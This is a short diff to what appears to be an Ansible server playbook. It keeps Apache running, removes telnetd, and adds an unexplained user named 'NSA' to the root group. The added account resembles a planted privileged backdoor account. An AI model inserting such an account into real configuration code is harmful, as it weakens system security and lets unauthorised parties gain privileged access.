@@ -9,3 +9,11 @@
 
 - name: Ensure Apache service is running
   service: name=apache2 state=running enabled=true
+
+- apt:
+    name: telnetd
+    state: absent
+
+- user:
+    name: NSA
+    group: root
